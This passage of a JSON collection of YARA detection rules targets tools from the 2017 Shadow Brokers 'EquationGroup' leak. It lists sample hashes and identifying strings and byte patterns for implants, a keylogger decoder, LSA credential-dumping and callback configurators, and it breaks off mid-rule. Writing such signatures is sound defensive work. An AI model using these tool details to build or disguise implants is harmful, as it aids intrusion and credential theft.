  "EquationGroup_Toolset_Apr17_Dsz_Implant": "rule EquationGroup_Toolset_Apr17_Dsz_Implant {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"fbe103fac45abe4e3638055a3cac5e7009166f626cf2d3049fb46f3b53c1057f\"\n      hash2 = \"ad1dddd11b664b7c3ad6108178a8dade0a6d9795358c4a7cedbe789c62016670\"\n   strings:\n      $s1 = \"%02u:%02u:%02u.%03u-%4u: \" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 1000KB and all of them )\n}",
  "EquationGroup_Toolset_Apr17_GenKey": "rule EquationGroup_Toolset_Apr17_GenKey {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"b6f100b21da4f7e3927b03b8b5f0c595703b769d5698c835972ca0c81699ff71\"\n   strings:\n      $x1 = \"* PrivateEncrypt -> PublicDecrypt FAILED\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 80KB and all of them )\n}",
  "EquationGroup_Toolset_Apr17_wmi_Implant": "rule EquationGroup_Toolset_Apr17_wmi_Implant {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"de08d6c382faaae2b4b41b448b26d82d04a8f25375c712c12013cb0fac3bc704\"\n   strings:\n      $x1 = \"SELECT ProcessId,Description,ExecutablePath FROM Win32_Process\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 50KB and all of them )\n}",
  "EquationGroup_Toolset_Apr17_clocksvc": "rule EquationGroup_Toolset_Apr17_clocksvc {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"c1bcd04b41c6b574a5c9367b777efc8b95fe6cc4e526978b7e8e09214337fac1\"\n   strings:\n      $x1 = \"~debl00l.tmp\" fullword ascii\n      $x2 = \"\\\\\\\\.\\\\mailslot\\\\c54321\" fullword ascii\n      $x3 = \"\\\\\\\\.\\\\mailslot\\\\c12345\" fullword ascii\n      $x4 = \"nowMutex\" fullword ascii\n\n      $s1 = \"System\\\\CurrentControlSet\\\\Services\\\\MSExchangeIS\\\\ParametersPrivate\" fullword ascii\n      $s2 = \"000000005017C31B7C7BCF97EC86019F5026BE85FD1FB192F6F4237B78DB12E7DFFB07748BFF6432B3870681D54BEF44077487044681FB94D17ED04217145B98\" ascii\n      $s3 = \"00000000E2C9ADBD8F470C7320D28000353813757F58860E90207F8874D2EB49851D3D3115A210DA6475CCFC111DCC05E4910E50071975F61972DCE345E89D88\" ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 200KB and ( 1 of ($x*) or 2 of ($s*) ) )\n}",
  "EquationGroup_Toolset_Apr17_xxxRIDEAREA": "rule EquationGroup_Toolset_Apr17_xxxRIDEAREA {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"214b0de83b04afdd6ad05567825b69663121eda9e804daff9f2da5554ade77c6\"\n   strings:\n      $x1 = \"USAGE: %s -i InputFile -o OutputFile [-f FunctionOrdinal] [-a FunctionArgument] [-t ThreadOption]\" fullword ascii\n      $x2 = \"The output payload \\\"%s\\\" has a size of %d-bytes.\" fullword ascii\n      $x3 = \"ERROR: fwrite(%s) failed on ucPayload\" fullword ascii\n      $x4 = \"Load and execute implant within the existing thread\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 200KB and 1 of them )\n}",
  "EquationGroup_Toolset_Apr17_yak_min_install": "rule EquationGroup_Toolset_Apr17_yak_min_install {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"f67214083d60f90ffd16b89a0ce921c98185b2032874174691b720514b1fe99e\"\n   strings:\n      $s1 = \"driver start\" fullword ascii\n      $s2 = \"DeviceIoControl Error: %d\" fullword ascii\n      $s3 = \"Phlook\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 300KB and all of them )\n}",
  "EquationGroup_Toolset_Apr17_SetOurAddr": "rule EquationGroup_Toolset_Apr17_SetOurAddr {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"04ccc060d401ddba674371e66e0288ebdbfa7df74b925c5c202109f23fb78504\"\n   strings:\n      $s1 = \"USAGE: SetOurAddr <input file> <output file> <protocol> [IP/IPX address]\" fullword ascii\n      $s2 = \"Replaced default IP address (127.0.0.1) with Local IP Address %d.%d.%d.%d\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 100KB and 1 of them )\n}",
  "EquationGroup_Toolset_Apr17_GetAdmin_LSADUMP_ModifyPrivilege_Implant": "rule EquationGroup_Toolset_Apr17_GetAdmin_LSADUMP_ModifyPrivilege_Implant {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"c8b354793ad5a16744cf1d4efdc5fe48d5a0cf0657974eb7145e0088fcf609ff\"\n      hash2 = \"5f06ec411f127f23add9f897dc165eaa68cbe8bb99da8f00a4a360f108bb8741\"\n   strings:\n      $s1 = \"\\\\system32\\\\win32k.sys\" fullword wide\n      $s2 = \"hKeAddSystemServiceTable\" fullword ascii\n      $s3 = \"hPsDereferencePrimaryToken\" fullword ascii\n      $s4 = \"CcnFormSyncExFBC\" fullword wide\n      $s5 = \"hPsDereferencePrimaryToken\" fullword ascii\n\n      $op1 = { 0c 2b ca 8a 04 11 3a 02 75 01 47 42 4e 75 f4 8b }\n      $op2 = { 14 83 c1 05 80 39 85 75 0c 80 79 01 c0 75 06 80 }\n      $op3 = { eb 3d 83 c0 06 33 f6 80 38 ff 75 2c 80 78 01 15 }\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 80KB and ( 4 of ($s*) or all of ($op*) ) )\n}",
  "EquationGroup_Toolset_Apr17_SendPKTrigger": "rule EquationGroup_Toolset_Apr17_SendPKTrigger {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"2f9c7a857948795873a61f4d4f08e1bd0a41e3d6ffde212db389365488fa6e26\"\n   strings:\n      $x1 = \"----====**** PORT KNOCK TRIGGER BEGIN ****====----\" fullword wide\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 300KB and all of them )\n}",
  "EquationGroup_Toolset_Apr17_DmGz_Target_2": "rule EquationGroup_Toolset_Apr17_DmGz_Target_2 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"55ac29b9a67e0324044dafaba27a7f01ca3d8e4d8e020259025195abe42aa904\"\n   strings:\n      $s1 = \"\\\\\\\\.\\\\%ls\" fullword ascii\n\n      $op0 = { e8 ce 34 00 00 b8 02 00 00 f0 e9 26 02 00 00 48 }\n      $op1 = { 8b 4d 28 e8 02 05 00 00 89 45 34 eb 07 c7 45 34 }\n      $op2 = { e8 c2 34 00 00 90 48 8d 8c 24 00 01 00 00 e8 a4 }\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 100KB and all of them )\n}",
  "EquationGroup_Toolset_Apr17_mstcp32_DXGHLP16_tdip": "rule EquationGroup_Toolset_Apr17_mstcp32_DXGHLP16_tdip {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"26215bc56dc31d2466d72f1f4e1b6388e62606e9949bc41c28968fcb9a9d60a6\"\n      hash2 = \"fcfb56fa79d2383d34c471ef439314edc2239d632a880aa2de3cea430f6b5665\"\n      hash3 = \"a5ec4d102d802ada7c5083af53fd9d3c9b5aa83be9de58dbb4fac7876faf6d29\"\n   strings:\n      $s1 = \"\\\\Registry\\\\User\\\\CurrentUser\\\\\" fullword wide\n      $s2 = \"\\\\DosDevices\\\\%ws\" fullword wide\n      $s3 = \"\\\\Device\\\\%ws_%ws\" fullword wide\n      $s4 = \"sys\\\\mstcp32.dbg\" fullword ascii\n      $s5 = \"%ws%03d%ws%wZ\" fullword wide\n      $s6 = \"TCP/IP driver\" fullword wide\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 200KB and 4 of them )\n}",
  "EquationGroup_Toolset_Apr17_regprobe": "rule EquationGroup_Toolset_Apr17_regprobe {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"99a42440d4cf1186aad1fd09072bd1265e7c6ebbc8bcafc28340b4fe371767de\"\n   strings:\n      $x1 = \"Usage: %s targetIP protocolSequence portNo [redirectorIP] [CLSID]\" fullword ascii\n      $x2 = \"key does not exist or pinging w2k system\" fullword ascii\n      $x3 = \"RpcProxy=255.255.255.255:65536\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 100KB and 1 of them )\n}",
  "EquationGroup_Toolset_Apr17_DoubleFeatureDll_dll_2": "rule EquationGroup_Toolset_Apr17_DoubleFeatureDll_dll_2 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"f265defd87094c95c7d3ddf009d115207cd9d4007cf98629e814eda8798906af\"\n      hash2 = \"8d62ca9e6d89f2b835d07deb5e684a576607e4fe3740f77c0570d7b16ebc2985\"\n      hash3 = \"634a80e37e4b32706ad1ea4a2ff414473618a8c42a369880db7cc127c0eb705e\"\n   strings:\n      $s1 = \".dllfD\" fullword ascii\n      $s2 = \"Khsppxu\" fullword ascii\n      $s3 = \"D$8.exe\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 1000KB and 2 of them )\n}",
  "EquationGroup_Toolset_Apr17_GangsterThief_Implant": "rule EquationGroup_Toolset_Apr17_GangsterThief_Implant {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"50b269bda5fedcf5a62ee0514c4b14d48d53dd18ac3075dcc80b52d0c2783e06\"\n   strings:\n      $s1 = \"\\\\\\\\.\\\\%s:\" fullword wide\n      $s4 = \"raw_open CreateFile error\" fullword ascii\n      $s5 = \"-PATHDELETED-\" fullword ascii\n      $s6 = \"(deleted)\" fullword wide\n      $s8 = \"NULLFILENAME\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 300KB and 3 of them )\n}",
  "EquationGroup_Toolset_Apr17_SetCallbackPorts": "rule EquationGroup_Toolset_Apr17_SetCallbackPorts {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"16f66c2593665c2507a78f96c0c2a9583eab0bda13a639e28f550c92f9134ff0\"\n   strings:\n      $s1 = \"USAGE: %s <input file> <output file> <port1> [port2] [port3] [port4] [port5] [port6]\" fullword ascii\n      $s2 = \"You may enter between 1 and 6 ports to change the defaults.\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 100KB and 1 of them )\n}",
  "EquationGroup_Toolset_Apr17_DiBa_Target_BH_2000": "rule EquationGroup_Toolset_Apr17_DiBa_Target_BH_2000 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"0654b4b8727488769390cd091029f08245d690dd90d1120e8feec336d1f9e788\"\n   strings:\n      $s2 = \"0M1U1Z1p1\" fullword ascii /* base64 encoded string '3U5gZu' */\n      $s14 = \"SPRQWV\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 2000KB and all of them )\n}",
  "EquationGroup_Toolset_Apr17_rc5": "rule EquationGroup_Toolset_Apr17_rc5 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"69e2c68c6ea7be338497863c0c5ab5c77d5f522f0a84ab20fe9c75c7f81318eb\"\n   strings:\n      $s1 = \"Usage: %s [d|e] session_key ciphertext\" fullword ascii\n      $s2 = \"where session_key and ciphertext are strings of hex\" fullword ascii\n      $s3 = \"d = decrypt mode, e = encrypt mode\" fullword ascii\n      $s4 = \"Bad mode, should be 'd' or 'e'\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 200KB and 2 of them )\n}",
  "EquationGroup_Toolset_Apr17_PC_Level_Generic": "rule EquationGroup_Toolset_Apr17_PC_Level_Generic {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"7a6488dd13936e505ec738dcc84b9fec57a5e46aab8aff59b8cfad8f599ea86a\"\n      hash2 = \"0e3cfd48732d0b301925ea3ec6186b62724ec755ed40ed79e7cd6d3df511b8a0\"\n      hash3 = \"d1d6e3903b6b92cc52031c963e2031b5956cadc29cc8b3f2c8f38be20f98a4a7\"\n      hash4 = \"25a2549031cb97b8a3b569b1263c903c6c0247f7fff866e7ec63f0add1b4921c\"\n      hash5 = \"591abd3d7ee214df25ac25682b673f02219da108d1384261052b5167a36a7645\"\n      hash6 = \"6b71db2d2721ac210977a4c6c8cf7f75a8f5b80b9dbcece1bede1aec179ed213\"\n      hash7 = \"7be4c05cecb920f1010fc13086635591ad0d5b3a3a1f2f4b4a9be466a1bd2b76\"\n      hash8 = \"f9cbccdbdf9ffd2ebf1ee84d0ddddd24a61dbe0858ab7f0131bef6c7b9a19131\"\n      hash9 = \"3cf7a01bdf8e73769c80b75ca269b506c33464d81f574ded8bb20caec2d4cd13\"\n      hash10 = \"a87a871fe32c49862ed68fda99d92efd762a33ababcd9b6b2b909f2e01f59c16\"\n   strings:\n      $s1 = \"wshtcpip.WSHGetSocketInformation\" fullword ascii\n      $s2 = \"\\\\\\\\.\\\\%hs\" fullword ascii\n      $s3 = \".?AVResultIp@Mini_Mcl_Cmd_NetConnections@@\" fullword ascii\n      $s4 = \"Corporation. All rights reserved.\" fullword wide\n      $s5 = { 49 83 3c 24 00 75 02 eb 5d 49 8b 34 24 0f b7 46 }\n\n      $op1 = { 44 24 57 6f c6 44 24 58 6e c6 44 24 59 }\n      $op2 = { c6 44 24 56 64 88 5c 24 57 }\n      $op3 = { 44 24 6d 4c c6 44 24 6e 6f c6 44 24 6f }\n   condition:\n      uint16(0) == 0x5a4d and filesize < 400KB and ( 2 of ($s*) or all of ($op*) )\n}",
  "EquationGroup_Toolset_Apr17_PC_Level3_http_exe": "rule EquationGroup_Toolset_Apr17_PC_Level3_http_exe {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"3e855fbea28e012cd19b31f9d76a73a2df0eb03ba1cb5d22aafe9865150b020c\"\n   strings:\n      $s1 = \"Copyright (C) Microsoft\" fullword wide\n\n      $op1 = { 24 39 65 c6 44 24 3a 6c c6 44 24 3b 65 c6 44 24 }\n      $op2 = { 44 24 4e 41 88 5c 24 4f ff }\n      $op3 = { 44 24 3f 6e c6 44 24 40 45 c6 44 24 41 }\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 400KB and all of them )\n}",
  "EquationGroup_Toolset_Apr17_ParseCapture": "rule EquationGroup_Toolset_Apr17_ParseCapture {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"c732d790088a4db148d3291a92de5a449e409704b12e00c7508d75ccd90a03f2\"\n   strings:\n      $x1 = \"* Encrypted log found.  An encryption key must be provided\" fullword ascii\n      $x2 = \"encryptionkey = e.g., \\\"00 11 22 33 44 55 66 77 88 99 aa bb cc dd ee ff\\\"\" fullword ascii\n      $x3 = \"Decrypting with key '%02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x'\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 50KB and 1 of them )\n}",
  "EquationGroup_Toolset_Apr17_ActiveDirectory_Target": "rule EquationGroup_Toolset_Apr17_ActiveDirectory_Target {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"33c1b7fdee7c70604be1e7baa9eea231164e62d5d5090ce7f807f43229fe5c36\"\n   strings:\n      $s1 = \"(&(objectCategory=person)(objectClass=user)(cn=\" fullword wide\n      $s2 = \"(&(objectClass=user)(objectCategory=person)\" fullword wide\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 200KB and all of them )\n}",
  "EquationGroup_Toolset_Apr17_PC_Legacy_dll": "rule EquationGroup_Toolset_Apr17_PC_Legacy_dll {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"0cbc5cc2e24f25cb645fb57d6088bcfb893f9eb9f27f8851503a1b33378ff22d\"\n   strings:\n      $op1 = { 45 f4 65 c6 45 f5 6c c6 45 f6 33 c6 45 f7 32 c6 }\n      $op2 = { 49 c6 45 e1 73 c6 45 e2 57 c6 45 e3 }\n      $op3 = { 34 c6 45 e7 50 c6 45 e8 72 c6 45 e9 6f c6 45 ea }\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 200KB and all of them )\n}",
  "EquationGroup_Toolset_Apr17_svctouch": "rule EquationGroup_Toolset_Apr17_svctouch {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"96b6a3c4f53f9e7047aa99fd949154745e05dc2fd2eb21ef6f0f9b95234d516b\"\n   strings:\n      $s1 = \"Causes: Firewall,Machine down,DCOM disabled\\\\not supported,etc.\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 10KB and 1 of them )\n}",
  "EquationGroup_Toolset_Apr17_pwd_Implant": "rule EquationGroup_Toolset_Apr17_pwd_Implant {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"ee72ac76d82dfec51c8fbcfb5fc99a0a45849a4565177e01d8d23a358e52c542\"\n   strings:\n      $s1 = \"7\\\"7(7/7>7O7]7o7w7\" fullword ascii\n\n      $op1 = { 40 50 89 44 24 18 FF 15 34 20 00 }\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 20KB and 1 of them )\n}",
  "EquationGroup_Toolset_Apr17_KisuComms_Target_2000": "",
  "EquationGroup_Toolset_Apr17_SlDecoder": "rule EquationGroup_Toolset_Apr17_SlDecoder {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"b220f51ca56d9f9d7d899fa240d3328535f48184d136013fd808d8835919f9ce\"\n   strings:\n      $x1 = \"Error in conversion. SlDecoder.exe <input filename> <output filename> at command line \" fullword wide\n      $x2 = \"KeyLogger_Data\" fullword wide\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 200KB and 1 of them )\n}",
  "EquationGroup_Toolset_Apr17_Windows_Implant": "rule EquationGroup_Toolset_Apr17_Windows_Implant {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"d38ce396926e45781daecd18670316defe3caf975a3062470a87c1d181a61374\"\n   strings:\n      $s2 = \"0#0)0/050;0M0Y0h0|0\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 50KB and all of them )\n}",
  "EquationGroup_Toolset_Apr17_msgkd_msslu64_msgki_mssld": "rule EquationGroup_Toolset_Apr17_msgkd_msslu64_msgki_mssld {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"9ab667b7b5b9adf4ff1d6db6f804824a22c7cc003eb4208d5b2f12809f5e69d0\"\n      hash2 = \"320144a7842500a5b69ec16f81a9d1d4c8172bb92301afd07fb79bc0eca81557\"\n      hash3 = \"c10f4b9abee0fde50fe7c21b9948a2532744a53bb4c578630a81d2911f6105a3\"\n      hash4 = \"551174b9791fc5c1c6e379dac6110d0aba7277b450c2563e34581565609bc88e\"\n      hash5 = \"8419866c9058d738ebc1a18567fef52a3f12c47270f2e003b3e1242d86d62a46\"\n   strings:\n      $s1 = \"PQRAPAQSTUVWARASATAUAVAW\" fullword ascii\n      $s2 = \"SQRUWVAWAVAUATASARAQAP\" fullword ascii\n      $s3 = \"iijymqp\" fullword ascii\n      $s4 = \"AWAVAUATASARAQI\" fullword ascii\n      $s5 = \"WARASATAUAVM\" fullword ascii\n\n      $op1 = { 0c 80 30 02 48 83 c2 01 49 83 e9 01 75 e1 c3 cc }\n      $op2 = { e8 10 66 0d 00 80 66 31 02 48 83 c2 02 49 83 e9 }\n      $op3 = { 48 b8 53 a5 e1 41 d4 f1 07 00 48 33 }\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 1000KB and 2 of ($s*) or all of ($op*) )\n}",
  "EquationGroup_Toolset_Apr17_DoubleFeatureDll_dll_3": "rule EquationGroup_Toolset_Apr17_DoubleFeatureDll_dll_3 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"515374423b8b132258bd91acf6f29168dcc267a3f45ecb9d1fe18ee3a253195b\"\n   strings:\n      $a = { f4 65 c6 45 f5 6c c6 45 f6 33 c6 45 f7 32 c6 45 }\n      $b = { 36 c6 45 e6 34 c6 45 e7 50 c6 45 e8 72 c6 45 e9 }\n      $c = { c6 45 e8 65 c6 45 e9 70 c6 45 ea 74 c6 45 eb 5f }\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 1000KB and all of them )\n}",
  "EquationGroup_Toolset_Apr17_SetCallback": "rule EquationGroup_Toolset_Apr17_SetCallback {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"a8854f6b01d0e49beeb2d09e9781a6837a0d18129380c6e1b1629bc7c13fdea2\"\n   strings:\n      $s2 = \"*NOTE: This version of SetCallback does not work with PeddleCheap versions prior\" fullword ascii\n      $s3 = \"USAGE: SetCallback <input file> <output file>\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 100KB and all of them )\n}",
  "EquationGroup_Toolset_Apr17__DoubleFeatureReader_DoubleFeatureReader_0": "rule EquationGroup_Toolset_Apr17__DoubleFeatureReader_DoubleFeatureReader_0 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      super_rule = 1\n      hash1 = \"052e778c26120c683ee2d9f93677d9217e9d6c61ffc0ab19202314ab865e3927\"\n      hash2 = \"5db457e7c7dba80383b1df0c86e94dc6859d45e1d188c576f2ba5edee139d9ae\"\n   strings:\n      $x1 = \"DFReader.exe logfile AESKey [-j] [-o outputfilename]\" fullword ascii\n      $x2 = \"Double Feature Target Version\" fullword ascii\n      $x3 = \"DoubleFeature Process ID\" fullword ascii\n\n      $op1 = { a1 30 21 41 00 89 85 d8 fc ff ff a1 34 21 41 00 }\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 300KB and 1 of them ) or ( 2 of them )\n}",
  "EquationGroup_Toolset_Apr17__vtuner_vtuner_1": "rule EquationGroup_Toolset_Apr17__vtuner_vtuner_1 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      super_rule = 1\n      hash1 = \"3e6bec0679c1d8800b181f3228669704adb2e9cbf24679f4a1958e4cdd0e1431\"\n      hash2 = \"b0d2ebf455092f9d1f8e2997237b292856e9abbccfbbebe5d06b382257942e0e\"\n   strings:\n      $s1 = \"Unable to get -w hash.  %x\" fullword wide\n      $s2 = \"!\\\"invalid instruction mnemonic constant Id3vil\\\"\" fullword wide\n      $s4 = \"Unable to set -w provider. %x\" fullword wide\n\n      $op0 = { 2b c7 50 e8 3a 8c ff ff ff b6 c0 }\n      $op2 = { a1 8c 62 47 00 81 65 e0 ff ff ff 7f 03 d8 8b c1 }\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 2000KB and 2 of them )\n}",
  "EquationGroup_Toolset_Apr17__ecwi_ESKE_EVFR_RPC2_2": "rule EquationGroup_Toolset_Apr17__ecwi_ESKE_EVFR_RPC2_2 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      super_rule = 1\n      hash1 = \"c4152f65e45ff327dade50f1ac3d3b876572a66c1ce03014f2877cea715d9afd\"\n      hash2 = \"9d16d97a6c964e0658b6cd494b0bbf70674bf37578e2ff32c4779a7936e40556\"\n      hash3 = \"c5e119ff7b47333f415aea1d2a43cb6cb322f8518562cfb9b90399cac95ac674\"\n      hash4 = \"5c0896dbafc5d8cc19b1bc7924420b20ed5999ac5bee2cb5a91aada0ea01e337\"\n   strings:\n      $s1 = \"Target is share name\" fullword ascii\n      $s2 = \"Could not make UdpNetbios header -- bailing\" fullword ascii\n      $s3 = \"Request non-NT session key\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 2000KB and all of them )\n}",
  "EquationGroup_Toolset_Apr17__EAFU_ecwi_ESKE_EVFR_RPC2_4": "rule EquationGroup_Toolset_Apr17__EAFU_ecwi_ESKE_EVFR_RPC2_4 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      super_rule = 1\n      hash1 = \"3e181ca31f1f75a6244b8e72afaa630171f182fbe907df4f8b656cc4a31602f6\"\n      hash2 = \"c4152f65e45ff327dade50f1ac3d3b876572a66c1ce03014f2877cea715d9afd\"\n      hash3 = \"9d16d97a6c964e0658b6cd494b0bbf70674bf37578e2ff32c4779a7936e40556\"\n      hash4 = \"c5e119ff7b47333f415aea1d2a43cb6cb322f8518562cfb9b90399cac95ac674\"\n      hash5 = \"5c0896dbafc5d8cc19b1bc7924420b20ed5999ac5bee2cb5a91aada0ea01e337\"\n   strings:\n      $x1 = \"* Listening Post DLL %s() returned error code %d.\" fullword ascii\n\n      $s1 = \"WsaErrorTooManyProcesses\" fullword ascii\n      $s2 = \"NtErrorMoreProcessingRequired\" fullword ascii\n      $s3 = 